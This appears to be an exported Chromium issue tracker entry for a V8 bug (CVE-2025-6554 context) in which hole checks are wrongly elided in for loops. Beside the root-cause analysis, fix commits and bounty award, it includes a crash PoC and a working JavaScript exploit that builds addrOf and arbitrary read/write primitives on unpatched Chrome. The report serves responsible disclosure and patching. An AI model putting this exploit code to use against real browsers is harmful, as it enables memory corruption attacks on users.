# TDZ check elision leading to hole leak

| Field | Value |
|-------|-------|
| **Issue ID** | [450618029](https://issues.chromium.org/issues/450618029) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **CVE IDs** | CVE-2025-6554 |
| **Reporter** | ry...@gmail.com |
| **Assignee** | ve...@chromium.org |
| **Created** | 2025-10-10 |
| **Bounty** | $50,000.00 |

## Description

## Summary

Hole checks can be incorrectly elided when processing a for statement, potentially resulting in hole leak and type confusion.

## RCA

When handling for statements, the bytecode generator follows a specific dominator order in which it assumes BODY dominates NEXT, so they share the same elision scope. However, this is not always the case for statements in BODY and NEXT.

```
  // C-style for loops' textual order differs from dominator order.
  //
  // for (INIT; TEST; NEXT) BODY
  // REST
  //
  //   has the dominator order of
  //
  // INIT dominates TEST dominates BODY dominates NEXT

```

As demonstrated in the code at BytecodeGenerator::VisitForStatement, both BODY and NEXT reside within the same elision scope. For example, if a variable `y` is initialized in BODY and a CONTINUE statement exists prior to its initialization, `y` will be incorrectly marked as initialized. Consequently, when `y` is used in the NEXT statement, the hole check will be improperly elided in NEXT before usage, leaking hole values into the JavaScript scope.

```
  HoleCheckElisionScope elider(this);
  VisitIterationBody(stmt, &loop_builder);
  if (stmt->next() != nullptr) {
    builder()->SetStatementPosition(stmt->next());
    Visit(stmt->next());
  }

```
## POC

The following PoC was tested against the latest commit `fed47445bbdd1a69b70f2b93a761c62c1e0f769c` at the time of reporting, using the pre-compiled debug binary from `gs://v8-asan/mac-debug/d8-asan-mac-debug-v8-component-103041.zip`.

```
function use(x) {
    % DebugPrint(x);
    let map = new Map();
    map.delete(x);
}
function pwn() {
    for (var i = 0; i < 1; use(y)) {
        if (i == 0)
            continue;
        y;

    }
    let y;
}

pwn();

```

output:

```
DebugPrint: 0x7900020001: [Hole] in ReadOnlySpace
  <the_hole_value>
0x7900000745: [Map] in ReadOnlySpace
 - map: 0x007900000475 <MetaMap (0x00790000002d <null>)>
 - type: HOLE_TYPE
 - instance size: 4
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - stable_map
 - non-extensible
 - back pointer: 0x007900000011 <undefined>
 - prototype_validity_cell: 0
 - instance descriptors (own) #0: 0x0079000007e5 <DescriptorArray[0]>
 - prototype: 0x00790000002d <null>
 - constructor: 0x00790000002d <null>
 - dependent code: 0x0079000007cd <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0



#
# Fatal error in ../../src/objects/objects-inl.h, line 2073
# Debug check failed: instance_type != HOLE_TYPE (HOLE_TYPE (272) vs. HOLE_TYPE (272)).
#
#
#
#FailureMessage Object: 0x12f477c60
==== C stack trace ===============================

    0   d8                                  0x00000001097ea6d3 v8::base::debug::StackTrace::StackTrace() + 19
    1   d8                                  0x0000000109800d91 v8::platform::(anonymous namespace)::PrintStackTrace() + 305
    2   d8                                  0x00000001097b384a V8_Fatal(char const*, int, char const*, ...) + 666
    3   d8                                  0x00000001097b2a2f v8::base::(anonymous namespace)::DefaultDcheckHandler(char const*, int, char const*) + 47
    4   d8                                  0x0000000100c1bc0f v8::internal::Object::GetSimpleHash(v8::internal::Tagged<v8::internal::Object>) + 2959
    5   d8                                  0x0000000100b86280 v8::internal::Object::GetHash(v8::internal::Tagged<v8::internal::Object>) + 192
    6   d8                                  0x0000000102dcf759 v8::internal::OrderedHashMap::GetHash(v8::internal::Isolate*, unsigned long) + 185
    7   ???                                 0x000000018d17281b 0x0 + 6662072347
    8   ???                                 0x000000018cc50685 0x0 + 6656689797
    9   ???                                 0x000000018cc50685 0x0 + 6656689797
[1]    99221 trace trap  ./d8 --allow-natives-syntax poc.js

```
## Exploit

Vulnerability exploitation is possible through existing techniques, as demonstrated in CVE-2025-6554, which was resolved by commit [869dc4afa04b792da08e7a6e01d4981b4118c894](https://chromium.googlesource.com/v8/v8/+/869dc4afa04b792da08e7a6e01d4981b4118c894).

The following script demonstrates the ability to perform arbitrary read and write operations within the sandbox, tested and confirmed to work on both the parent commit 9ba45bdfdd8 and the latest Chrome Extended Stable version 140.0.7339.240.

```
class Helpers {
  constructor() {
    this.buf = new ArrayBuffer(8);
    this.dv = new DataView(this.buf);
    this.u8 = new Uint8Array(this.buf);
    this.u32 = new Uint32Array(this.buf);
    this.u64 = new BigUint64Array(this.buf);
    this.f32 = new Float32Array(this.buf);
    this.f64 = new Float64Array(this.buf);

    this.roots = new Array(0x30000);
    this.index = 0;
  }

  pair_i32_to_f64(p1, p2) {
    this.u32[0] = p1;
    this.u32[1] = p2;
    return this.f64[0];
  }

  i64tof64(i) {
    this.u64[0] = i;
    return this.f64[0];
  }

  f64toi64(f) {
    this.f64[0] = f;
    return this.u64[0];
  }

  set_i64(i) {
    this.u64[0] = i;
  }

  set_l(i) {
    this.u32[0] = i;
  }

  set_h(i) {
    this.u32[1] = i;
  }

  get_i64() {
    return this.u64[0];
  }

  ftoil(f) {
    this.f64[0] = f;
    return this.u32[0];
  }

  ftoih(f) {
    this.f64[0] = f;
    return this.u32[1];
  }

  add_ref(object) {
    this.roots[this.index++] = object;
  }

  mark_sweep_gc() {
    new ArrayBuffer(0x7fe00000);
  }

  scavenge_gc() {
    for (var i = 0; i < 8; i++) {
      // fill up new space external backing store bytes
      this.add_ref(new ArrayBuffer(0x200000));
    }
    this.add_ref(new ArrayBuffer(8));
  }

  hex(i) {
    return i.toString(16).padStart(16, "0");
  }

  breakpoint() {
    this.buf.slice();
  }
}

var helper = new Helpers();

helper.mark_sweep_gc();
helper.mark_sweep_gc();

function pwn(trigger) {
  var hole;

  for (var i = 0; i < 1; hole = y, i++) {
    if (i == 0) continue;
    y;
  }
  let y;

  let o = {};
  o.s = trigger ? hole : "not the hole";
  var s = 2 - (Math.sign(o.s.length) + 1);
  var i = 2 * ((5 - (s + 4)) >> 1) + 2;
  let idx = i * 200;

  let arr = new Array(8);
  let flt_arr = [1.1];
  let obj_arr = [flt_arr, flt_arr];
  arr[0] = 13.37;

  arr[idx] = 13.37;
  return [arr, flt_arr, obj_arr];
}

for (var i = 0; i < 0x100000; i++) {
  pwn(false);
  pwn(false);
  pwn(false);
  pwn(false);
}
let [corrupted, flt_arr, obj_arr] = pwn(true);

function addrOf(obj) {
  obj_arr[0] = obj;
  return helper.ftoil(corrupted[15]);
}

function aar(addr) {
  corrupted[13] = helper.pair_i32_to_f64(addr - 7, 0x10);
  return flt_arr[0];
}

function read8(addr) {
  return helper.f64toi64(aar(addr));
}

function read4(addr) {
  return helper.ftoil(aar(addr));
}

function aaw(addr, value) {
  corrupted[13] = helper.pair_i32_to_f64(addr - 7, 0x10);
  flt_arr[0] = value;
}

function write8(addr, value) {
  aaw(addr, helper.i64tof64(value));
}

function write4(addr, value) {
  aaw(addr, helper.pair_i32_to_f64(value, read4(addr + 4)));
}

```
## Bitsect

The issue was introduced by commit [7ce3a5517944fdac428313d80f8cd49474dce667](https://chromiumdash.appspot.com/commit/7ce3a5517944fdac428313d80f8cd49474dce667) and enabled by commit [5593d76d69094933d115d496d14aa0c2fde0c266](https://chromiumdash.appspot.com/commit/5593d76d69094933d115d496d14aa0c2fde0c266)

## Timeline

### cl...@appspot.gserviceaccount.com (2025-10-10)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5253947887386624.

### 24...@project.gserviceaccount.com (2025-10-10)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2025-10-10)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/v8/v8/+/e2341bbc5bd1c7d6fd475b795ddac3072bbbc307 ([objects] Add HashTableHole for OrderedHashTable

introduce a new Hole type that is used for Maps/Sets which are backed
by OrderedHashTables.

Bug: chromium:1445008
Change-Id: Id6f2a786b1b3320778c942c773732577f88a83b2
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4747084
Reviewed-by: Tobias Tebbi <tebbi@chromium.org>
Reviewed-by: Leszek Swirski <leszeks@chromium.org>
Commit-Queue: Carl Smith <cffsmith@google.com>
Reviewed-by: Michael Lippautz <mlippautz@chromium.org>
Cr-Commit-Position: refs/heads/main@{#89946}
).

If this is incorrect, please let us know why and apply the hotlistid:5433122. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### 24...@project.gserviceaccount.com (2025-10-10)

Detailed Report: https://clusterfuzz.com/testcase?key=5253947887386624

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  instance_type != HOLE_TYPE in objects-inl.h
  v8::internal::Object::GetSimpleHash
  v8::internal::Object::GetHash
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=89945:89946

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5253947887386624

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### ve...@chromium.org (2025-10-10)

Thanks for the report! Will be fixed by <https://chromium-review.googlesource.com/c/v8/v8/+/7030683>

### dx...@google.com (2025-10-10)

Project: v8/v8  

Branch:  main  

Author:  Toon Verwaest [verwaest@chromium.org](mailto:verwaest@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7030683>

[interpreter] Merge hole elision info on continue

---


Expand for full commit details
```
     
    for loops that are structured 
     
      for (start; cond; next) { body } 
     
    currently have a single scope for 
     
      body 
      next 
     
    but that's wrong, since body isn't guaranteed to run to the end before 
    running next. There might be a `continue`. This considers `body` to be 
    "branchy" with any continue merging before next, as well as the body 
    end itself. 
     
    Bug: 450618029 
    Change-Id: I0156e1c02eeafad880bd324f1f5441023d53139d 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7030683 
    Auto-Submit: Toon Verwaest <verwaest@chromium.org> 
    Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#103064}

```

---

Files:

- M `src/interpreter/bytecode-generator.cc`
- A `test/message/fail/for-of-uninitialized.js`
- A `test/message/fail/for-of-uninitialized.out`

---

Hash: [1f5fbf68240881514b88112d13c146facdb60244](https://chromiumdash.appspot.com/commit/1f5fbf68240881514b88112d13c146facdb60244)  

Date: Fri Oct 10 14:48:24 2025


---

### 24...@project.gserviceaccount.com (2025-10-11)

ClusterFuzz testcase 5253947887386624 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=103063:103064

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### ch...@google.com (2025-10-11)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Security bugs need the Severity (S0-S3) and the Found In set, which will enable the bots to request merges to the correct branches (as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact ([security@chromium.org](mailto:security@chromium.org)) to arrange to set these labels. Severity guidelines: <https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues> FoundIn guidelines: <https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security>
  After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### el...@chromium.org (2025-10-14)

Security shepherd: speculative severity Sev-1 since this is a v8 memory corruption bug.

### el...@chromium.org (2025-10-14)

verwaest: is this fixed now?

### ve...@chromium.org (2025-10-15)

S1 seems reasonable. It's fixed.

### ml...@google.com (2025-10-15)

benmason: The FoundIn field is set here. Why was this reopened? There's *a lot* of churn on the bugs these days...

### ch...@google.com (2025-10-15)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2025-10-15)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M140. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M141. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M142. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [140, 141, 142].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ts...@google.com (2025-10-15)

CL seems reasonably small, please merge to m142 (14.2) by Mon 20-Oct.

### sp...@google.com (2025-10-17)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $50000.00 for this report.

Rationale for this decision:
Renderer memory corruption in a sandboxed process with high-quality report demonstrating controlled write


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### dx...@google.com (2025-10-20)

Project: v8/v8  

Branch:  refs/branch-heads/14.2  

Author:  Toon Verwaest [verwaest@chromium.org](mailto:verwaest@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7054545>

Merged: [interpreter] Merge hole elision info on continue

---


Expand for full commit details
```
     
    for loops that are structured 
     
      for (start; cond; next) { body } 
     
    currently have a single scope for 
     
      body 
      next 
     
    but that's wrong, since body isn't guaranteed to run to the end before 
    running next. There might be a `continue`. This considers `body` to be 
    "branchy" with any continue merging before next, as well as the body 
    end itself. 
     
    Bug: 450618029 
    (cherry picked from commit 1f5fbf68240881514b88112d13c146facdb60244) 
     
    Change-Id: I91e0ec460f643f12877fe25a8168e240b9b5ada0 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7054545 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Auto-Submit: Toon Verwaest <verwaest@chromium.org> 
    Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.2@{#17} 
    Cr-Branched-From: 37f82dbb9f640dc5eea09870dd391cd3712546e5-refs/heads/14.2.231@{#1} 
    Cr-Branched-From: d1a6089b861336cf4b3887edfd3fdd280b23b5dd-refs/heads/main@{#102804}

```

---

Files:

- M `src/interpreter/bytecode-generator.cc`
- A `test/message/fail/for-of-uninitialized.js`
- A `test/message/fail/for-of-uninitialized.out`

---

Hash: [0798df0e8f53853f6483ba34a665f27c598cba65](https://chromiumdash.appspot.com/commit/0798df0e8f53853f6483ba34a665f27c598cba65)  

Date: Fri Oct 10 14:48:24 2025


---

### pe...@google.com (2025-10-20)

LTS Milestone M138

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### ch...@google.com (2025-10-20)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### qk...@google.com (2025-10-23)

Labelling as not applicable for M138-LTS, because the fix generated a lot of test failures in M138.

### ch...@google.com (2025-10-24)

This V8 bug has been marked as a release blocker. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### ry...@gmail.com (2025-10-28)

deleted

### ch...@google.com (2026-01-22)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> Renderer memory corruption in a sandboxed process with high-quality report demonstrating controlled write

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/450618029)*
